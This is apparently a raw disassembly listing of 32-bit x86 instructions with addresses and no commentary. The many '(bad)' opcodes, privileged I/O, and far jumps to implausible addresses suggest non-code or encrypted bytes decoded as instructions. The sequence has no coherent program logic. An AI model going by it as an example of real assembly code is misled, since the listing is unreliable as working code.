  415e4f:	mov    ?,esp
  415e51:	or     edx,DWORD PTR [ebp-0x5a]
  415e54:	push   0xe92507c1
  415e59:	outs   dx,DWORD PTR ds:[esi]
  415e5a:	and    eax,0x5aa6f32b
  415e5f:	xor    eax,0xa1eb8954
  415e64:	push   edi
  415e65:	je     0x415e2e
  415e67:	cmc    
  415e68:	mov    al,ds:0x5b1e02fe
  415e6d:	jnp    0x415ec7
  415e6f:	test   DWORD PTR [ecx-0x2a9b2eb5],esp
  415e75:	xchg   DWORD PTR [edi],ebx
  415e77:	fnsave [ecx]
  415e79:	inc    edx
  415e7a:	pop    ds
  415e7b:	push   0x899615b
  415e80:	mov    cs:0x12aa0331,eax
  415e86:	adc    eax,0x3166a21e
  415e8b:	pop    edx
  415e8c:	retf   0xfb5c
  415e8f:	pop    ebx
  415e90:	in     eax,0x69
  415e92:	push   edx
  415e93:	popa   
  415e94:	jne    0x415e3e
  415e96:	loopne 0x415ed7
  415e98:	mov    esi,0x5bb9869a
  415e9d:	push   ss
  415e9e:	cmp    esp,DWORD PTR [eax-0x34]
  415ea1:	imul   esp,DWORD PTR [eax+edi*2],0xffffffc5
  415ea5:	in     eax,0xca
  415ea7:	addr16 aam 0x7a
  415eaa:	sbb    BYTE PTR [ebx-0x42d56a1a],ah
  415eb0:	add    bl,BYTE PTR [eax]
  415eb2:	or     BYTE PTR [ecx+0x708d767],bl
  415eb8:	push   ecx
  415eb9:	adc    DWORD PTR cs:[ebp+0x80cf1e9],ebx
  415ec0:	push   0x31
  415ec2:	in     eax,dx
  415ec3:	push   ecx
  415ec4:	push   es
  415ec5:	into   
  415ec6:	dec    ebx
  415ec7:	pop    ds
  415ec8:	clc    
  415ec9:	push   eax
  415eca:	or     DWORD PTR [eax-0x56],edx
  415ecd:	jb     0x415ec3
  415ecf:	pop    ebx
  415ed0:	or     edi,ecx
  415ed2:	ss pop eax
  415ed4:	and    eax,0x97820f78
  415ed9:	ins    BYTE PTR es:[edi],dx
  415eda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415edb:	scas   al,BYTE PTR es:[edi]
  415edc:	inc    ebx
  415edd:	int    0xe4
  415edf:	sbb    DWORD PTR [ecx+0x1d79f4c2],esi
  415ee5:	and    DWORD PTR [ebx+0x4b],esi
  415ee8:	cmp    dl,ch
  415eea:	push   ds
  415eeb:	xchg   eax,esp
  415eed:	add    esi,edx
  415eef:	adc    al,0x33
  415ef1:	into   
  415ef2:	imul   edi,DWORD PTR [edi],0xc43a453f
  415ef8:	sahf   
  415ef9:	mov    eax,0xa018f7d0
  415efe:	js     0x415f6d
  415f00:	loopne 0x415ee4
  415f02:	dec    DWORD PTR [ecx+0x6397e184]
  415f08:	add    eax,esp
  415f0a:	inc    ebp
  415f0b:	sbb    DWORD PTR [edx+0x745093a],0x3409f357
  415f15:	mov    ch,0x26
  415f17:	pop    edi
  415f18:	jns    0x415f2c
  415f1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f1b:	call   0xd951:0x980b33be
  415f22:	in     eax,0x82
  415f24:	(bad)  
  415f25:	repnz xchg ecx,eax
  415f27:	push   edi
  415f29:	out    dx,al
  415f2a:	fsubr  DWORD PTR [eax-0x41]
  415f2d:	leave  
  415f2e:	add    ebx,DWORD PTR [ebx]
  415f30:	fsubr  QWORD PTR [ecx+0x5c70d990]
  415f36:	or     ah,dl
  415f38:	sub    edi,ebx
  415f3a:	(bad)  [esi]
  415f3c:	fisttp QWORD PTR [eax]
  415f3e:	add    dl,al
  415f40:	jmp    0x7c0c9bf7
  415f45:	jmp    0xc876:0xdaf597af
  415f4c:	clc    
  415f4d:	or     ah,BYTE PTR [ecx]
  415f4f:	add    DWORD PTR [esi+0x26],edx
  415f52:	or     eax,0x6e6ca3b5
  415f57:	cmp    ebp,edx
  415f59:	sub    eax,0xd691185a
  415f5e:	mov    ebx,fs
  415f60:	es out 0x95,al
  415f63:	sbb    eax,0xc36a8228
  415f68:	push   esi
  415f69:	or     BYTE PTR ds:0x677796d6,0xc8
  415f70:	add    eax,0xdf462074
  415f75:	addr16 shl edi,0xb0
  415f79:	adc    ebx,DWORD PTR [eax+0x5fd24f9]
  415f7f:	cmp    eax,0xc273a811
  415f84:	cmp    ch,ah
  415f86:	bound  esi,QWORD PTR [ebx]
  415f88:	pop    edi
  415f89:	(bad)  [ebp+0x61f0dc8]
  415f8f:	jbe    0x415f23
  415f91:	dec    ecx
  415f92:	sbb    ebx,DWORD PTR [esi+0x7847fe9e]
  415f98:	into   
  415f99:	(bad)
  415f9c:	cmp    eax,0x10aec25f
  415fa1:	das    
  415fa2:	cmp    esi,DWORD PTR [edx]
  415fa4:	popf   
  415fa5:	fbld   TBYTE PTR [edx-0x50d85039]
  415fab:	lea    esi,[edi-0x3]
  415fae:	dec    edi
  415faf:	xlat   BYTE PTR ds:[ebx]
  415fb0:	push   edx
  415fb1:	xchg   ecx,edi
  415fb3:	xor    BYTE PTR [esi],dl
  415fb5:	inc    edx
  415fb6:	mov    ecx,0xc66a66a7
  415fbb:	rol    DWORD PTR [edx+0x3cfebd2e],cl
  415fc1:	outs   dx,BYTE PTR ds:[esi]
  415fc2:	icebp  
  415fc3:	aam    0x15
  415fc5:	or     bl,BYTE PTR [ecx]
  415fc7:	inc    ebx
  415fc8:	(bad)  
  415fc9:	mov    dl,0x14
  415fcb:	cld    
  415fcc:	sbb    al,al
  415fce:	push   esp
  415fcf:	dec    edx
  415fd0:	ret    
  415fd1:	(bad)  
  415fd2:	cmc    
  415fd3:	outs   dx,DWORD PTR ds:[esi]
  415fd4:	inc    ebx
  415fd5:	push   eax
  415fd6:	mov    ds:0xbfb3b5fd,eax
  415fdb:	jecxz  0x415fd0
  415fdd:	ins    DWORD PTR es:[edi],dx
  415fde:	pop    ebp
  415fdf:	mov    BYTE PTR [edi],bl
  415fe1:	push   esi
  415fe2:	imul   ebp,DWORD PTR [eax-0x70],0xffffff96
  415fe6:	repnz mov BYTE PTR [ebx-0x12a1a313],bl
  415fed:	fidiv  WORD PTR [ebx]
  415fef:	dec    edx
  415ff0:	aam    0xc7
  415ff2:	cwde   
  415ff3:	pop    esi
  415ff4:	and    al,0xd9
  415ff6:	jg     0x416070
  415ff8:	mov    dh,bl
  415ffa:	call   0xd8c8b3f1
  415fff:	mov    edx,0x41e86ba8
  416004:	and    dh,ch
  416006:	outs   dx,DWORD PTR ds:[esi]
  416007:	sbb    BYTE PTR [ecx-0x1d],dl
  41600a:	fdivr  DWORD PTR [ebx]
  41600c:	xor    edx,DWORD PTR [esi+0x64dff012]
  416012:	add    eax,0x35e2f75f
  416017:	retf   0x987d
  41601a:	mov    ss,WORD PTR [ebx-0x151ece15]
  416020:	cmp    DWORD PTR [ebp+ebx*8+0x16],ebx
  416024:	jnp    0x416064
  416026:	or     edi,DWORD PTR [esi+edi*2+0x1]
  41602a:	call   0xca511f98
  41602f:	enter  0x75bd,0xa1
  416033:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416034:	and    DWORD PTR [eax-0x1],0x8f8b9758
  41603b:	in     al,dx
  41603c:	and    dl,BYTE PTR [ebp+0x60]
  41603f:	(bad)  
  416040:	xchg   ecx,eax
  416041:	mov    al,ds:0x3cd50e
  416046:	or     edi,ecx
  416048:	rcl    BYTE PTR [ebp+0x796304f5],1
  41604e:	mov    al,ds:0x86d0f882
  416053:	mov    dh,0xb0
  416055:	jns    0x4160a0
  416057:	inc    edx
  416058:	pusha  
  416059:	rcl    DWORD PTR [esp+eax*1],cl
  41605c:	xchg   ebp,eax
  41605d:	(bad)  
  41605e:	jb     0x41605d
  416060:	mov    bh,0x64
  416062:	pusha  
  416063:	add    ebx,DWORD PTR [ecx+0x3fd3ea01]
  416069:	daa    
  41606a:	pop    ebp
  41606b:	jmp    0x38:0xfd361f18
  416072:	mov    dl,0xf
  416074:	and    ebx,DWORD PTR [ebx]
  416076:	mov    bh,0xb1
  416078:	sub    al,0x81
  41607a:	cmp    bl,BYTE PTR [ebx]
  41607c:	jae    0x41608e
  41607e:	mov    edx,0x8675b91c
  416083:	and    BYTE PTR [ebx],0x84
  416086:	jb     0x41603b
  416088:	in     eax,0xa2
  41608a:	xchg   edx,eax
  41608b:	push   0xffffffd6
  41608d:	rcr    DWORD PTR [ecx],1
  41608f:	mov    ah,0xb6
  416091:	bnd jno 0x4160a0
  416094:	mov    bl,0x22
  416096:	shr    ch,1
  416098:	pop    ecx
  416099:	cmp    BYTE PTR [edi-0x5a4d4c89],bl
  41609f:	sbb    eax,0xad21bd5a
  4160a4:	mov    bh,0x6e
  4160a6:	scas   eax,DWORD PTR es:[edi]
  4160a7:	mov    fs,WORD PTR [ecx]
  4160a9:	sub    BYTE PTR [ebx+0x4d0018c6],dl
  4160af:	and    eax,0x4e1a71e8
  4160b4:	fucom  st(1)
  4160b6:	sub    ebx,ecx
  4160b8:	inc    ebx
  4160b9:	(bad)  
  4160ba:	aaa    
  4160bb:	mov    eax,ds:0xa03dd917
  4160c0:	fs cli 
  4160c2:	stos   DWORD PTR es:[edi],eax
  4160c3:	push   ebp
  4160c4:	fwait
  4160c5:	xlat   BYTE PTR ds:[ebx]
  4160c6:	jecxz  0x416144
  4160c8:	popf   
  4160c9:	sbb    eax,0x5bc200fd
  4160ce:	(bad)  
  4160cf:	out    dx,eax
  4160d0:	sub    ch,BYTE PTR [esi+edi*8+0x17]
  4160d4:	sahf   
  4160d5:	cld    
  4160d6:	mov    BYTE PTR [ebp-0x2d4690fb],dl
  4160dc:	sbb    dh,bl
  4160de:	aaa    
  4160df:	lock inc edi
  4160e1:	into   
  4160e2:	dec    edx
  4160e3:	mov    edx,0x507a0c0c
  4160e8:	mov    BYTE PTR [eax],bl
  4160ea:	add    ebp,edi
  4160ec:	jbe    0x4160d9
  4160ee:	mov    ch,0xea
  4160f0:	ret    0xb835
  4160f3:	cmp    BYTE PTR [edx],ch
  4160f5:	clc    
  4160f6:	es sub eax,0x4254adc3
  4160fc:	mov    cl,0x5f
  4160fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160ff:	in     al,0x45
  416101:	bound  esi,QWORD PTR [edi+0x460cc373]
  416107:	pop    esi
  416108:	sbb    eax,0x11bf2579
  41610d:	js     0x41613f
  41610f:	enter  0xb0a9,0x8f
  416113:	cli    
  416114:	pop    edi
  416115:	mov    dl,0x15
  416117:	lods   eax,DWORD PTR ds:[esi]
  416118:	jo     0x4160ce
  41611a:	adc    ecx,DWORD PTR [edx]
  41611c:	jmp    0xb0c9ebfa
  416121:	in     al,dx
  416122:	xchg   esi,eax
  416123:	fldenv [ebx+0x6a19fa22]
  416129:	dec    ebp
  41612a:	test   DWORD PTR [esi],esi
  41612c:	mul    BYTE PTR [ebx]
  41612e:	js     0x41610c
  416130:	mov    WORD PTR [esi-0x2cec1ab1],ss
  416136:	std    
  416137:	mov    al,ds:0xe07753d6
  41613c:	mov    ebp,eax
  41613e:	mov    fs:0x1a533550,al
  416144:	xor    al,0xbe
  416146:	addr16 loope 0x416161
  416149:	pop    ds
  41614a:	add    eax,esi
  41614c:	sub    esp,DWORD PTR [eiz*8+0xd04b13a]
  416153:	cmp    BYTE PTR [eax+0x4e],bh
  416156:	cmp    ecx,0x77
  416159:	repz sar ecx,1
  41615c:	mov    ah,BYTE PTR [ebx-0x347de397]
  416162:	push   ds
  416163:	int    0x80
  416165:	jl     0x416125
  416167:	inc    ecx
  416168:	xchg   ebp,eax
  416169:	jge    0x4161e0
  41616b:	push   ecx
  41616c:	scas   eax,DWORD PTR es:[edi]
  41616d:	xchg   ebx,eax
  41616e:	mov    esi,0x5a74c5bd
  416173:	mov    ebp,DWORD PTR [ebx]
  416175:	fidiv  DWORD PTR ds:0xbd99c7c4
  41617b:	sbb    BYTE PTR [esi],dl
  41617d:	stc    
  41617e:	jae    0x41616c
  416180:	mov    bl,BYTE PTR [edx-0x2d]
  416183:	scas   al,BYTE PTR es:[edi]
  416184:	jb     0x416132
  416186:	pop    edx
  416187:	or     bl,BYTE PTR es:[eax-0xc1f0a46]
  41618e:	xor    edi,ebp
  416190:	retf   0x52e1
  416193:	add    BYTE PTR [eax+esi*1+0x6],al
  416197:	xor    ah,dh
  416199:	cmp    al,0xba
  41619b:	test   DWORD PTR ds:0xa1b9d9cc,ebp
  4161a1:	scas   eax,DWORD PTR es:[edi]
  4161a2:	js     0x41617b
  4161a4:	je     0x41615e
  4161a6:	sub    BYTE PTR [edx+0x38],0xf3
  4161aa:	popa   
  4161ab:	pop    edx
  4161ac:	hlt    
  4161ad:	scas   al,BYTE PTR es:[edi]
  4161ae:	imul   esp,DWORD PTR [ebp-0x43],0x36b80b5c
  4161b5:	adc    bl,ch
  4161b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161b8:	vmulpd ymm3,ymm6,ymm7
  4161bc:	clc    
  4161bd:	inc    esi
  4161be:	pop    edi
  4161bf:	xchg   ecx,eax
  4161c0:	cdq    
  4161c1:	mov    edi,0x4a2b37ad
  4161c6:	dec    edx
  4161c7:	rcr    DWORD PTR [esi],0xe6
  4161ca:	jae    0x416239
  4161cc:	dec    ebx
  4161cd:	div    BYTE PTR [ebp-0x234404e2]
  4161d3:	dec    eax
  4161d4:	fwait
  4161d5:	call   0x4aaaa700
  4161da:	cld    
  4161db:	popa   
  4161dc:	stos   DWORD PTR es:[edi],eax
  4161dd:	and    esi,esp
  4161df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161e0:	bound  edi,QWORD PTR [eax-0x27141e96]
  4161e6:	jge    0x4161b7
  4161e8:	add    eax,0x261e7d0e
  4161ed:	aaa    
  4161ee:	or     DWORD PTR [ecx-0x47800faa],ebx
  4161f4:	lods   eax,DWORD PTR ds:[esi]
  4161f5:	psraw  mm7,QWORD PTR [ebx]
  4161f8:	les    eax,FWORD PTR [ebp-0x19]
  4161fb:	stc    
  4161fc:	lahf   
  4161fd:	jmp    0xae708d86
  416202:	pop    es
  416203:	jae    0x41626b
  416205:	popf   
  416206:	mov    ebx,0x86f491be
  41620b:	add    al,0x77
  41620d:	pusha  
  41620e:	jle    0x4161ac
  416210:	outs   dx,BYTE PTR ds:[esi]
  416211:	mov    eax,ds:0xf330e160
  416216:	adc    eax,0xdfd3633f
  41621b:	pop    ss
  41621c:	imul   edi,DWORD PTR [esi],0x38d99198
  416222:	push   0xf7778034
  416227:	push   esi
  416228:	jp     0x41629f
  41622a:	push   es
  41622b:	pop    ds
  41622c:	jp     0x41628d
  41622e:	xchg   BYTE PTR [esi-0x253c308b],al
  416234:	inc    ebx
  416235:	sub    bh,BYTE PTR gs:[edi-0x70304a3a]
  41623c:	sti    
  41623d:	test   al,0x5e
  41623f:	iret   
  416240:	fsubr  QWORD PTR [edi+0x20]
  416243:	mov    cl,0xf9
  416245:	popf   
  416246:	fs enter 0x7602,0x59
  41624b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41624c:	push   cs
  41624d:	push   es
  41624e:	pushf  
  41624f:	sub    eax,0x53ae790
  416254:	test   DWORD PTR [edx+0x58c0716b],0xad3c6bcf
  41625e:	jecxz  0x416263
  416260:	push   ebx
  416261:	cmp    al,0x3c
  416263:	test   BYTE PTR [edx+0x69812b35],dh
  416269:	rcr    esp,0x30
  41626c:	push   ds
  41626d:	lods   eax,DWORD PTR ds:[esi]
  41626e:	(bad)  
  41626f:	das    
  416270:	adc    DWORD PTR [ecx-0x70c1aa97],esi
  416276:	jnp    0x416299
  416278:	mov    esp,0xc96f302f
  41627d:	mov    DWORD PTR [eax],0xf45e8e15
  416283:	inc    ebp
  416284:	mov    ch,0x68
  416286:	push   es
  416287:	mov    esi,0x57d5471a
  41628c:	pop    ecx
  41628d:	mov    cl,cl
  41628f:	sbb    eax,0x686e0973
  416294:	ins    DWORD PTR es:[edi],dx
  416295:	mov    ebx,0xd90e733b
  41629a:	pop    edx
  41629b:	xor    eax,DWORD PTR [ecx+edx*4-0x3d]
  41629f:	stos   BYTE PTR es:[edi],al
  4162a0:	mov    edi,eax
  4162a2:	ja     0x4162b4
  4162a4:	add    edi,eax
  4162a6:	cdq    
  4162a7:	push   0x5d
  4162a9:	pop    ss
  4162aa:	jmp    0xa2d795a2
  4162af:	scas   eax,DWORD PTR es:[edi]
  4162b0:	add    BYTE PTR [edi-0x607d6f15],dl
  4162b6:	mov    ecx,0xad2db56d
  4162bb:	fwait
  4162bc:	test   DWORD PTR [edx],esi
  4162be:	fisttp QWORD PTR [ecx+0x3c]
  4162c1:	add    eax,0x26cf0342
  4162c6:	sbb    ah,BYTE PTR [esi+0x2a]
  4162c9:	pop    ss
  4162ca:	push   ebx
  4162cb:	mov    edi,0x8b6f279
  4162d0:	popa   
  4162d1:	push   ds
  4162d2:	es cmc 
  4162d4:	(bad)  
  4162d5:	icebp  
  4162d6:	mov    WORD PTR [esi-0x41ba50bb],es
  4162dc:	in     eax,0x65
  4162de:	push   ds
  4162df:	jbe    0x41632e
  4162e1:	add    al,0xa0
  4162e3:	push   0xffffff81
  4162e5:	imul   ecx,DWORD PTR [eax-0x7ee147ca],0x27
  4162ec:	retf   0x8a9d
  4162ef:	popf   
  4162f0:	mov    bh,0x4d
  4162f2:	push   edi
  4162f3:	bound  ebp,QWORD PTR [edi+0x22c543cf]
  4162f9:	xchg   esi,eax
  4162fa:	pop    ebx
  4162fb:	sbb    BYTE PTR [esi*8+0x713528b7],ch
  416302:	mov    fs,WORD PTR [ebp+ebx*4+0x5]
  416306:	xchg   esi,eax
  416307:	sub    DWORD PTR [ebx-0x4216cafd],0xfffffff2
  41630e:	arpl   bx,dx
  416310:	int    0xd0
  416312:	in     eax,0x58
  416314:	iret   
  416315:	clc    
  416316:	xchg   esp,eax
  416317:	(bad)  
  416318:	int    0x11
  41631a:	mov    ecx,0x338bdef1
  41631f:	mov    ch,0x3e
  416321:	cmp    BYTE PTR [eax-0x2b3135f1],al
  416327:	jo     0x416367
  416329:	xor    DWORD PTR [ebx+ebx*4+0x211cd62e],ecx
  416330:	mov    dl,0x2f
  416332:	std    
  416333:	fild   QWORD PTR [esi]
  416335:	cdq    
  416336:	pop    ecx
  416337:	mov    eax,0xa4ebccfd
  41633c:	js     0x41634a
  41633e:	sahf   
  41633f:	dec    ebp
  416340:	int3   
  416341:	lods   al,BYTE PTR ds:[esi]
  416342:	es pop ebx
  416344:	dec    edi
  416345:	push   edi
  416346:	leave  
  416347:	sbb    BYTE PTR [esi+0x35],bl
  41634a:	popa   
  41634b:	xor    DWORD PTR [esi+0x5180117d],ecx
  416351:	aas    
  416352:	imul   edi,DWORD PTR [edi+0x45],0xffffffb8
  416356:	xchg   ecx,eax
  416357:	dec    ebx
  416358:	dec    ebp
  416359:	stos   DWORD PTR es:[edi],eax
  41635a:	xchg   ecx,eax
  41635b:	int3   
  41635c:	dec    eax
  41635d:	test   bh,al
  41635f:	jnp    0x41635a
  416361:	repnz mov esi,0x1b8e24dd
  416367:	lahf   
  416368:	push   eax
  416369:	xchg   esi,eax
  41636a:	scas   al,BYTE PTR es:[edi]
  41636b:	jecxz  0x41633e
  41636d:	dec    edx
  41636e:	mov    ebp,0x80cdc1f
  416373:	dec    ebp
  416374:	and    al,0x78
  416376:	xchg   edi,eax
  416377:	popa   
  416378:	dec    ebx
  416379:	test   eax,0xfc2f9afe
  41637e:	cmp    al,dh
  416380:	push   ds
  416381:	mov    bh,BYTE PTR [ebp-0x1c]
  416384:	inc    edi
  416385:	pop    ds
  416386:	lds    ecx,FWORD PTR [esp+eax*4]
  416389:	inc    edx
  41638a:	add    dh,0xb1
  41638d:	jbe    0x4163c1
  41638f:	test   al,0x96
  416391:	mov    ah,BYTE PTR [edx]
  416393:	xchg   esi,eax
  416394:	push   ecx
  416395:	stos   DWORD PTR es:[edi],eax
  416396:	sahf   
  416397:	fwait
  416398:	xchg   esp,eax
  416399:	mov    ds:0xe31f9fdd,eax
  41639e:	ss inc ebp
  4163a0:	pop    es
  4163a1:	and    al,0x3c
  4163a3:	push   ebx
  4163a4:	dec    ebx
  4163a5:	retf   
  4163a6:	sbb    edx,ebx
  4163a8:	mov    al,0xbb
  4163aa:	xlat   BYTE PTR gs:[ebx]
  4163ac:	jo     0x416346
  4163ae:	sub    BYTE PTR [ecx],bh
  4163b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163b1:	std    
  4163b2:	aam    0xa5
  4163b4:	adc    al,0xb4
  4163b6:	mov    ecx,0x98e03221
  4163bb:	pop    ebp
  4163bc:	mov    eax,ds:0x3724c1fd
  4163c1:	add    ah,ch
  4163c3:	outs   dx,DWORD PTR ds:[esi]
  4163c4:	push   esi
  4163c5:	sub    esp,eax
  4163c7:	jb     0x416432
  4163c9:	mov    esp,0x9f6b93ef
  4163ce:	cmc    
  4163cf:	xchg   esp,eax
  4163d0:	(bad)  
  4163d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163d2:	xor    eax,0x68e61126
  4163d7:	bound  edx,QWORD PTR ds:[edi-0x5d]
  4163db:	mov    eax,ds:0x5ad118da
  4163e0:	push   edx
  4163e1:	jp     0x416429
  4163e3:	cdq    
  4163e4:	inc    edi
  4163e5:	add    ch,ah
  4163e7:	test   DWORD PTR [edi],eax
  4163e9:	dec    ecx
  4163ea:	mov    ebx,0xea87fd87
  4163ef:	lahf   
  4163f0:	arpl   WORD PTR [edi],bx
  4163f2:	mov    ebp,0xe984fd43
  4163f7:	popf   
  4163f8:	pop    es
  4163f9:	std    
  4163fa:	scas   al,BYTE PTR es:[edi]
  4163fb:	pop    eax
  4163fc:	mov    eax,0x63e3ad91
  416402:	lods   eax,DWORD PTR ds:[esi]
  416403:	pusha  
  416404:	mov    cl,0x72
  416406:	fwait
  416407:	outs   dx,DWORD PTR ds:[esi]
  416408:	loop   0x4163dd
  41640a:	test   DWORD PTR [ecx-0x439ae92b],esp
  416410:	mov    ds:0xf1ec49b8,al
  416415:	jno    0x41639e
  416417:	pop    eax
  416418:	(bad)  
  416419:	fstp   TBYTE PTR [ebx]
  41641b:	in     al,0x30
  41641d:	repnz sub esi,DWORD PTR [esi-0x51d93e17]
  416424:	dec    edi
  416425:	cmp    bl,bh
  416427:	pop    ebp
  416428:	and    al,0x24
  41642a:	adc    al,0xe0
  41642c:	mov    edx,0x100ab028
  416431:	ret    
  416432:	add    al,BYTE PTR [ecx+edx*2]
  416435:	mov    bh,0x31
  416437:	sub    ch,BYTE PTR [eax+0x538db461]
  41643d:	ror    DWORD PTR [ecx+0x52303290],cl
  416443:	jmp    0xea900438
  416448:	adc    BYTE PTR [ecx+0x12],cl
  41644b:	adc    DWORD PTR [eax],ebx
  41644d:	mov    bl,0xdc
  41644f:	mov    edx,0xfaaf1340
  416454:	data16 into 
  416456:	or     eax,0x901b9cab
  41645b:	jmp    0x8943:0x1a6b0686
  416462:	sar    bh,0x46
  416465:	scas   eax,DWORD PTR es:[edi]
  416466:	jne    0x416443
  416468:	dec    ebx
  416469:	push   0x18e45eb9
  41646e:	icebp  
  41646f:	shl    BYTE PTR [edi+0x29],1
  416472:	scas   al,BYTE PTR es:[edi]
  416473:	lahf   
  416474:	icebp  
  416475:	retf   
  416476:	sub    DWORD PTR [esi-0x2a],0x32d514ed
  41647d:	or     al,0x99
  41647f:	cmp    al,0x96
  416481:	cs ins BYTE PTR es:[edi],dx
  416483:	int    0x39
  416485:	inc    edx
  416486:	retf   0x3471
  416489:	sbb    BYTE PTR [edi+0x3f73deac],bl
  41648f:	or     BYTE PTR [esi+0x71],0x64
  416493:	in     al,dx
  416494:	outs   dx,DWORD PTR ds:[esi]
  416495:	cmp    eax,0x57c67ecc
  41649a:	test   al,0x45
  41649c:	aas    
  41649d:	push   ebp
  41649e:	test   eax,0x60f3e82f
  4164a3:	test   DWORD PTR [edi-0xc],eax
  4164a6:	enter  0xa514,0x8f
  4164aa:	arpl   WORD PTR [edi+0x44e6566a],sp
  4164b0:	add    ah,dl
  4164b2:	adc    al,0x4d
  4164b4:	pop    esp
  4164b5:	(bad)  
  4164b6:	addr16 add edi,ecx
  4164b9:	mov    ds:0xa6f1cc06,al
  4164be:	xchg   ebx,eax
  4164bf:	jnp    0x41652b
  4164c1:	mov    eax,ds:0x4ae4fc3
  4164c6:	or     DWORD PTR [eax-0x1f992fc],0x98e01dc3
  4164d0:	inc    esi
  4164d1:	lods   al,BYTE PTR ds:[esi]
  4164d2:	and    BYTE PTR [esi+0x56],0x73
  4164d6:	imul   ebx,DWORD PTR [esi],0xd2d8ba49
  4164dc:	jns    0x4164aa
  4164de:	mov    edi,0xe2348d0d
  4164e3:	adc    BYTE PTR [edx],dh
  4164e5:	push   ebp
  4164e6:	jb     0x4164dd
  4164e8:	and    DWORD PTR [edx],edi
  4164ea:	mov    DWORD PTR [eax],esp
  4164ec:	xor    ebx,edi
  4164ee:	call   0xd9923ad9
  4164f3:	cmp    dl,dh
  4164f5:	mov    ah,0x58
  4164f7:	jmp    FWORD PTR [esi]
  4164f9:	pushw  ds
  4164fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164fc:	cli    
  4164fd:	lds    ebp,FWORD PTR [edx+0x48caa87d]
  416503:	xor    ecx,DWORD PTR ds:0x2d7d3a4f
  416509:	cwde   
  41650a:	nop
  41650b:	mov    al,0x89
  41650d:	pop    edi
  41650e:	frstor [ecx+ebp*2+0x52]
  416512:	push   ebx
  416513:	retf   0x9ef8
  416516:	jns    0x416550
  416518:	leave  
  416519:	dec    ebp
  41651a:	pop    ebx
  41651b:	xor    DWORD PTR [esi+0x7a],ebx
  41651e:	pop    ss
  41651f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416520:	inc    ebx
  416521:	mov    WORD PTR [esi+ecx*8],ss
  416524:	lock ins DWORD PTR es:[edi],dx
  416526:	xor    ebx,esi
  416528:	push   ebp
  416529:	pop    edi
  41652a:	stos   DWORD PTR es:[edi],eax
  41652b:	inc    ecx
  41652c:	pop    ss
  41652d:	pop    ecx
  41652e:	inc    edi
  41652f:	inc    esp
  416530:	cmp    eax,ebx
  416532:	cs stc 
  416534:	pop    esi
  416535:	xchg   esi,eax
  416536:	stc    
  416537:	dec    esp
  416538:	mov    ah,0xa6
  41653a:	mov    DWORD PTR [edx],ebx
  41653c:	aas    
  41653d:	jae    0x41656c
  41653f:	mov    bh,0xd1
  416541:	leave  
  416542:	pop    edx
  416543:	and    esp,DWORD PTR [ebx-0x4397a3fa]
  416549:	out    0x3c,al
  41654b:	jno    0x4165c2
  41654d:	and    ebx,esp
  41654f:	push   cs
  416550:	imul   edi,DWORD PTR [edx+0x637da37f],0x28
  416557:	arpl   WORD PTR [ecx],bx
  416559:	xchg   esi,eax
  41655a:	inc    esi
  41655b:	sub    eax,0x5745500b
  416560:	lds    esp,FWORD PTR [ecx+esi*8-0x5f]
  416564:	mov    ax,0xad4c
  416568:	or     eax,0x504c303
  41656d:	push   0x79f3325b
  416572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416573:	jecxz  0x4164fa
  416575:	push   edx
  416576:	jo     0x416569
  416578:	(bad)  
  416579:	jns    0x416551
  41657b:	or     BYTE PTR [ecx-0xcb0df9d],dh
  416581:	inc    eax
  416582:	sub    ah,BYTE PTR [edi]
  416584:	xchg   BYTE PTR [ebx],dh
  416586:	cmp    edi,DWORD PTR [edi]
  416588:	data16 hlt 
  41658a:	les    esi,FWORD PTR [edi+0x2a]
  41658d:	shr    DWORD PTR [ebx+eiz*2+0x1e],1
  416591:	xchg   ecx,eax
  416592:	out    dx,eax
  416593:	dec    edx
  416594:	xor    ebx,eax
  416596:	pop    ss
  416597:	add    al,BYTE PTR [eax]
  416599:	or     bl,al
  41659b:	mov    bl,0xb3
  41659d:	cmp    al,0x4c
  41659f:	lods   al,BYTE PTR gs:[esi]
  4165a1:	fisubr DWORD PTR [ebx+edi*2]
  4165a4:	cdq    
  4165a5:	push   esi
  4165a6:	push   ecx
  4165a7:	aad    0x70
  4165a9:	bound  esi,QWORD PTR [eax]
  4165ab:	push   ss
  4165ac:	pop    es
  4165ad:	hlt    
  4165ae:	rol    DWORD PTR [eax+0x10],1
  4165b1:	or     cl,bl
  4165b3:	inc    ebx
  4165b4:	dec    ecx
  4165b5:	enter  0xddd3,0xb9
  4165b9:	mov    esi,0xc6a4d421
  4165be:	mov    edx,0xc409b076
  4165c3:	xor    BYTE PTR [esi+0x54],cl
  4165c6:	ret    
  4165c7:	push   esp
  4165c8:	xchg   edx,eax
  4165c9:	lods   eax,DWORD PTR ds:[esi]
  4165ca:	fs pop ebp
  4165cc:	aam    0xf2
  4165ce:	stos   BYTE PTR es:[edi],al
  4165cf:	adc    ebp,DWORD PTR [ebx*4-0x27a366b0]
  4165d6:	jp     0x416566
  4165d8:	fs (bad) 
  4165da:	rsm    
  4165dc:	pop    esp
  4165dd:	aaa    
  4165de:	rol    bl,1
  4165e0:	lea    eax,[edx+0x3724fbbe]
  4165e6:	mov    dl,0x86
  4165e8:	xchg   ebx,eax
  4165e9:	fld    QWORD PTR [ebx+esi*2+0x6f]
  4165ed:	dec    eax
  4165ee:	repz or eax,0x226153c
  4165f4:	(bad)  
  4165f5:	repnz mov bh,0xc1
  4165f8:	call   0x1dd93396
  4165fd:	stos   DWORD PTR es:[edi],eax
  4165fe:	je     0x4165f1
  416600:	imul   ebx,DWORD PTR [ecx+0x3a],0x708648e0
  416607:	adc    ecx,edx
  416609:	dec    ebx
  41660a:	loope  0x416680
  41660c:	nop
  41660d:	int3   
  41660e:	add    esi,esi
  416610:	loope  0x416671
  416612:	loope  0x416630
  416614:	or     edx,eax
  416616:	(bad)  
  416617:	out    dx,al
